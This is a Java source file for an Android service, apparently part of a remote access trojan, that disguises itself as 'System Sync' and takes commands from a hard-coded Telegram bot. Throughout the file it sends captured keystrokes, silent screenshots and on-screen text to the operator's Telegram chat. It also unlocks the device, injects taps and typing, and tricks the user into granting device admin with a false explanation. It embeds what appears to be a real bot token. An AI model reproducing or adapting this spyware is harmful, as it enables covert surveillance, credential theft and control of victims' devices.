package com.kanha.controller;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class TelegramService extends Service {
    private static final String BOT_TOKEN = "9272849646:AAECQLmcVE-68BC3EybuLRpxyAB8iUomFM8";
    private static final String CHAT_ID = "7169191595";
    private static final String CHANNEL_ID = "sys_sync_channel";
    private boolean isRunning = true;
    private int lastUpdateId = 0;
    private boolean isAwaitingText = false;

    private List<String> allAppNames = new ArrayList<>();
    private List<String> allAppPackages = new ArrayList<>();
    private int appPage = 0;
    private final int APPS_PER_PAGE = 24;

    // UPDATED MENU WITH SILENT SCREEN
    private static final String CONTROL_MENU_JSON = "{\"keyboard\":[" +
            "[{\"text\":\"⬆️ SCROLL UP\"},{\"text\":\"⬇️ SCROLL DOWN\"}]," +
            "[{\"text\":\"⬅️ SCROLL LEFT\"},{\"text\":\"➡️ SCROLL RIGHT\"}]," +
            "[{\"text\":\"🏠 HOME\"},{\"text\":\"🔙 BACK\"}]," +
            "[{\"text\":\"🔵 TOUCH SCAN ON\"},{\"text\":\"📸 SILENT SCREEN\"}]," +
            "[{\"text\":\"🔓 UNLOCK\"},{\"text\":\"🔔 NOTIF BAR\"}]," +
            "[{\"text\":\"🎛️ DISPLAY READ\"},{\"text\":\"🎯 AUTO TOUCH\"}]," +
            "[{\"text\":\"⌨️ TYPE TEXT\"},{\"text\":\"⌨️ KEYLOGS\"}]," +
            "[{\"text\":\"📱 APP OPEN\"},{\"text\":\"🔐 CHECK PERMS\"}]," +
            "[{\"text\":\"🛡️ GET ADMIN\"}]" +
            "],\"resize_keyboard\":true,\"is_persistent\":true}";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Sync")
                .setContentText("Syncing system data...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
        startForeground(1, notification);

        new Thread(new Runnable() {
            @Override
            public void run() {
                sendTextMessage("✅ System Sync is online and listening.", CONTROL_MENU_JSON);
                
                while (isRunning) {
                    try {
                        pollTelegram();
                        Thread.sleep(1000);
                    } catch (Exception e) {
                        Log.e("TelegramService", "Error", e);
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID, "System Sync Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    private void pollTelegram() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            if (conn.getResponseCode() == 200) {
                InputStream is = conn.getInputStream();
                Scanner s = new Scanner(is).useDelimiter("\\A");
                String result = s.hasNext() ? s.next() : "";
                s.close();

                JSONObject json = new JSONObject(result);
                JSONArray updates = json.getJSONArray("result");

                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    JSONObject message = update.optJSONObject("message");
                    if (message != null) {
                        String text = message.optString("text");
                        if (text != null && !text.isEmpty()) {
                            handleCommand(text.trim());
                        }
                    }
                }
            }
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void handleCommand(String rawCmd) {
        String cmd = rawCmd.trim().toUpperCase();

        if (cmd.contains("PING")) {
            sendTextMessage("🏓 PONG! Bot is active.", null);
            return;
        }

        if (cmd.contains("KILL_SWITCH")) {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, MyAdminReceiver.class);
            if (dpm != null) dpm.removeActiveAdmin(adminComponent);
            stopSelf();
            android.os.Process.killProcess(android.os.Process.myPid());
            return;
        }

        if (TouchAccessibilityService.instance == null) {
            sendTextMessage("⚠️ Accessibility Service is not running.", null);
            return;
        }

        if (cmd.contains("KEYLOGS")) {
            String logs = TouchAccessibilityService.instance.getAndClearLogs();
            if (logs.isEmpty()) {
                sendTextMessage("⌨️ No keystrokes captured yet.", null);
            } else {
                try {
                    File logFile = new File(getCacheDir(), "keylogs.txt");
                    FileOutputStream fos = new FileOutputStream(logFile);
                    fos.write(logs.getBytes());
                    fos.flush();
                    fos.close();
                    
                    sendTextMessage("📄 Uploading keylogs file...", null);
                    uploadDocument(logFile);
                } catch (Exception e) {
                    sendTextMessage("❌ Error creating log file: " + e.getMessage(), null);
                }
            }
            return;
        }

        if (cmd.contains("GET ADMIN")) {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, MyAdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                sendTextMessage("✅ Device Admin is ALREADY active.", null);
            } else {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system synchronization.");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                sendTextMessage("🔐 Admin screen opened. Please tap 'Activate'.", null);
            }
            return;
        }

        if (isAwaitingText && !cmd.startsWith("/")) {
            TouchAccessibilityService.instance.typeText(rawCmd);
            sendTextMessage("Typed: " + rawCmd, null);
            isAwaitingText = false;
            return;
        }

        if (cmd.contains("CHECK PERMS") || cmd.contains("CHECK PERMISSION")) {
            sendTextMessage(checkPermissions(), null);
            return;
        }
        
        if (cmd.equals("📱 APP OPEN")) {
            refreshApps();
            appPage = 0;
            showAppMenu(appPage);
            return;
        }
        
        if (cmd.equals("➡️ NEXT APPS")) {
            if (appPage < (allAppNames.size() / APPS_PER_PAGE)) {
                appPage++;
                showAppMenu(appPage);
            }
            return;
        }
        
        if (cmd.equals("⬅️ PREV APPS")) {
            if (appPage > 0) {
                appPage--;
                showAppMenu(appPage);
            }
            return;
        }

        if (cmd.equals("🔙 MAIN MENU")) {
            sendTextMessage("🎮 Main Menu:", CONTROL_MENU_JSON);
            return;
        }
        
        if (cmd.startsWith("📱 ")) {
            openApp(cmd.replace("📱 ", "").trim());
            return;
        }

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        float w = metrics.widthPixels;
        float h = metrics.heightPixels;

        if (cmd.contains("/START") || cmd.contains("CONTROL")) {
            sendTextMessage("🎮 Remote Control Sub-Menu Activated!", CONTROL_MENU_JSON);
        } 
        else if (cmd.contains("SCROLL UP")) {
            TouchAccessibilityService.instance.performSwipe(w/2, h*0.7f, w/2, h*0.3f, 300);
        } 
        else if (cmd.contains("SCROLL DOWN")) {
            TouchAccessibilityService.instance.performSwipe(w/2, h*0.3f, w/2, h*0.7f, 300);
        } 
        else if (cmd.contains("SCROLL LEFT")) {
            TouchAccessibilityService.instance.performSwipe(w*0.8f, h/2, w*0.2f, h/2, 300);
        } 
        else if (cmd.contains("SCROLL RIGHT")) {
            TouchAccessibilityService.instance.performSwipe(w*0.2f, h/2, w*0.8f, h/2, 300);
        } 
        else if (cmd.contains("UNLOCK")) {
            sendTextMessage("🔓 Waking and unlocking device...", null);
            TouchAccessibilityService.instance.wakeScreen();
            try { Thread.sleep(500); } catch (Exception e) {}
            TouchAccessibilityService.instance.swipeToUnlock();
        }
        else if (cmd.contains("HOME")) {
            TouchAccessibilityService.instance.performGlobalAction(TouchAccessibilityService.GLOBAL_ACTION_HOME);
        } 
        else if (cmd.contains("BACK")) {
            TouchAccessibilityService.instance.performGlobalAction(TouchAccessibilityService.GLOBAL_ACTION_BACK);
        } 
        else if (cmd.contains("NOTIF BAR")) {
            TouchAccessibilityService.instance.performGlobalAction(TouchAccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
            sendTextMessage("🔔 Notification bar opened.", null);
        }
        // --- SILENT SCREENSHOT LOGIC ---
        else if (cmd.contains("SILENT SCREEN") || cmd.contains("REFRESH SCREEN")) {
            sendTextMessage("📸 Taking silent screenshot...", null);
            TouchAccessibilityService.instance.captureScreen(this);
        } 
        else if (cmd.contains("DISPLAY READ")) {
            String screenText = TouchAccessibilityService.instance.readScreenText();
            if (screenText.length() > 3500) screenText = screenText.substring(0, 3500) + "...\n[Truncated]";
            sendTextMessage("📱 Screen Text:\n\n" + screenText, null);
        } 
        else if (cmd.contains("TYPE TEXT")) {
            isAwaitingText = true;
            sendTextMessage("Tap on the text field on the target device, then send the text you want to type here.", null);
        }
        else if (cmd.contains("TOUCH SCAN ON")) {
            sendTextMessage("📸 Capturing screen with grid...", null);
            TouchAccessibilityService.instance.captureScreenWithGrid(this);
        }
        else if (cmd.contains("AUTO TOUCH")) {
            for(int i=0; i<5; i++){
                TouchAccessibilityService.instance.performTouch(w/2, h/2, 100);
                try { Thread.sleep(100); } catch (Exception e) {}
            }
            sendTextMessage("Auto-touched center screen 5 times.", null);
        }
        else {
            float[] coords = GridMapper.getCoordinates(this, cmd);
            if (coords != null) {
                TouchAccessibilityService.instance.performTouch(coords[0], coords[1], 100);
            }
        }
    }

    private String checkPermissions() {
        StringBuilder sb = new StringBuilder("🔐 Permissions Status:\n\n");
        
        String service = getPackageName() + "/" + TouchAccessibilityService.class.getCanonicalName();
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {}
        boolean isAccessibilityOn = false;
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                isAccessibilityOn = settingValue.contains(service);
            }
        }
        sb.append("Accessibility: ").append(isAccessibilityOn ? "✅ ON" : "❌ OFF").append("\n");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            sb.append("Overlay: ").append(Settings.canDrawOverlays(this) ? "✅ ON" : "❌ OFF").append("\n");
        }

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyAdminReceiver.class);
        sb.append("Device Admin: ").append(dpm.isAdminActive(adminComponent) ? "✅ ON" : "❌ OFF").append("\n");
        
        return sb.toString();
    }

    private void refreshApps() {
        allAppNames.clear();
        allAppPackages.clear();
        PackageManager pm = getPackageManager();
        Intent intent = new Intent(Intent.ACTION_MAIN, null);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> apps = pm.queryIntentActivities(intent, 0);

        for (ResolveInfo app : apps) {
            String label = app.loadLabel(pm).toString();
            String pkg = app.activityInfo.packageName;
            if (!allAppNames.contains(label)) { 
                allAppNames.add(label);
                allAppPackages.add(pkg);
            }
        }
    }

    private void showAppMenu(int page) {
        if (allAppNames.isEmpty()) {
            sendTextMessage("No launchable apps found.", null);
            return;
        }

        int totalPages = (int) Math.ceil((double) allAppNames.size() / APPS_PER_PAGE);
        int start = page * APPS_PER_PAGE;
        int end = Math.min(start + APPS_PER_PAGE, allAppNames.size());

        JSONArray keyboard = new JSONArray();
        JSONArray row = new JSONArray();
        
        for (int i = start; i < end; i++) {
            try {
                JSONObject btn = new JSONObject();
                btn.put("text", "📱 " + allAppNames.get(i));
                row.put(btn);
                
                if (row.length() == 2) {
                    keyboard.put(row);
                    row = new JSONArray();
                }
            } catch (Exception e) {}
        }
        
        if (row.length() > 0) keyboard.put(row);
        
        try {
            JSONArray navRow = new JSONArray();
            if (page > 0) {
                navRow.put(new JSONObject().put("text", "⬅️ PREV APPS"));
            }
            if (page < totalPages - 1) {
                navRow.put(new JSONObject().put("text", "➡️ NEXT APPS"));
            }
            if (navRow.length() > 0) keyboard.put(navRow);

            JSONArray backRow = new JSONArray();
            backRow.put(new JSONObject().put("text", "🔙 MAIN MENU"));
            keyboard.put(backRow);
        } catch (Exception e) {}

        JSONObject markup = new JSONObject();
        try {
            markup.put("keyboard", keyboard);
            markup.put("resize_keyboard", true);
        } catch (Exception e) {}
        
        sendTextMessage("📱 Apps Part " + (page + 1) + "/" + totalPages + ":", markup.toString());
    }

    private void openApp(String appName) {
        int index = -1;
        for (int i = 0; i < allAppNames.size(); i++) {
            if (allAppNames.get(i).equalsIgnoreCase(appName)) {
                index = i;
                break;
            }
        }
        
        if (index != -1) {
            String pkg = allAppPackages.get(index);
            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(pkg);
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
                sendTextMessage("🚀 Opening " + appName + "...", null);
                return;
            }
        }
        sendTextMessage("❌ App not found or not launchable: " + appName, null);
    }

    public void sendTextMessage(String text, String replyMarkupJson) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + 
                                "&text=" + URLEncoder.encode(text, "UTF-8");
                if (replyMarkupJson != null) {
                    urlStr += "&reply_markup=" + URLEncoder.encode(replyMarkupJson, "UTF-8");
                }
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public void uploadDocument(File file) {
        new Thread(() -> {
            if (!file.exists() || file.length() == 0) {
                sendTextMessage("Error: File is empty or does not exist.", null);
                return;
            }

            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            try {
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("ENCTYPE", "multipart/form-data");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());

                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                request.writeBytes(CHAT_ID + lineEnd);

                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd);
                request.writeBytes("Content-Type: text/plain" + lineEnd + lineEnd);

                FileInputStream fileInputStream = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    request.write(buffer, 0, bytesRead);
                }
                fileInputStream.close();
                
                request.writeBytes(lineEnd);
                request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                request.flush();
                request.close();

                int responseCode = conn.getResponseCode();
                if (responseCode != 200) {
                    InputStream errorStream = conn.getErrorStream();
                    if (errorStream != null) {
                        Scanner s = new Scanner(errorStream).useDelimiter("\\A");
                        String errorBody = s.hasNext() ? s.next() : "";
                        s.close();
                        sendTextMessage("Upload failed. HTTP " + responseCode + "\n" + errorBody, null);
                    } else {
                        sendTextMessage("Upload failed. HTTP " + responseCode, null);
                    }
                }
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                sendTextMessage("Upload error: " + e.getMessage(), null);
            }
        }).start();
    }

    public void uploadScreenshot(File file) {
        new Thread(() -> {
            if (!file.exists() || file.length() == 0) {
                sendTextMessage("Error: File is empty or does not exist.", null);
                return;
            }

            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            try {
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("ENCTYPE", "multipart/form-data");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());

                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                request.writeBytes(CHAT_ID + lineEnd);

                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"" + file.getName() + "\"" + lineEnd);
                request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);

                FileInputStream fileInputStream = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    request.write(buffer, 0, bytesRead);
                }
                fileInputStream.close();
                
                request.writeBytes(lineEnd);
                request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                request.flush();
                request.close();

                int responseCode = conn.getResponseCode();
                if (responseCode != 200) {
                    InputStream errorStream = conn.getErrorStream();
                    if (errorStream != null) {
                        Scanner s = new Scanner(errorStream).useDelimiter("\\A");
                        String errorBody = s.hasNext() ? s.next() : "";
                        s.close();
                        sendTextMessage("Upload failed. HTTP " + responseCode + "\n" + errorBody, null);
                    } else {
                        sendTextMessage("Upload failed. HTTP " + responseCode, null);
                    }
                }
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                sendTextMessage("Upload error: " + e.getMessage(), null);
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}